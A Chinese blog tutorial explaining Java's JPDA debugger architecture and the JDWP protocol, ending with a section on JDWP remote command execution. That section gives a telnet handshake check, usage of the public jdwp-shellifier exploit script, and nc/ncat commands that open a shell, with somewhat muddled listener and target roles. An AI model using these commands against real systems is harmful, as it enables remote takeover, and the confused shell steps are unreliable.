from https://blog.csdn.net/wanzt123/article/details/82793023
# Java 调试体系
JPDA（Java Platform Debugger Architecture）：即Java平台调试体系架构。Java虚拟机设计的专门的API接口供调试和监控虚拟机使用

JPDA按照抽象层次，又分为三层，分别是：

- JVM TI（Java VM Tool Interface）：虚拟机对外暴露的接口，包括debug和profile。
- JDWP（Java Debug Wire Protocol）：调试器和应用之间通信的协议。
- JDI（Java Debug Interface）：Java库接口，实现了JDWP协议的客户端，调试器可以用来和远程被调试应用通信。


# JDWP
JDWP（Java DEbugger Wire Protocol）：即Java调试线协议，是一个为Java调试而设计的通讯交互协议，它定义了调试器和被调试程序之间传递的信息的格式。说白了就是JVM或者类JVM的虚拟机都支持一种协议，通过该协议，Debugger 端可以和 target VM 通信，可以获取目标 VM的包括类、对象、线程等信息，在调试Android应用程序这一场景中，Debugger一般是指你的 develop machine 的某一支持 JDWP协议的工具例如 Android Studio 或者 JDB，而 Target JVM是指运行在你mobile设备当中的各个App（因为它们都是一个个虚拟机 Dalvik 或者 ART），JDWP Agent一般负责监听某一个端口，当有 Debugger向这一个端口发起请求的时候，Agent 就转发该请求给 target JVM并最终由该 JVM 来处理请求，并把 reply 信息返回给 Debugger 端。

# JDWP 远程命令执行漏洞
漏洞验证：

- telnet端口后，输入命令JDWP-Handshake，

如果返回JDWP-Handshake，证明存在漏洞。而且如果输入JDWP-Handshake的速度不够快的话，连接很快就会断开。

- telnet 目标IP 目标端口

漏洞利用脚本：https://github.com/IOActive/jdwp-shellifier

使用方法：

- python jdwp-shellifier.py -t 目标主机ip -p jdwp运行端口 --cmd "Your Command"

比如我们可以执行一个反弹shell的命令：

漏洞利用过程如下：

攻击者主机上执行监听命令：
- nc -lvvp 1234

被攻击的目标主机上执行命令：
- python jdwp-shellifier.py -t 127.0.0.1 -p 8000 --cmd "ncat -lvvp 1234 -e /bin/bash"

>注：nc反弹shell有好几种方法，请根据具体情况进行修改，也可用其他方式反弹shell。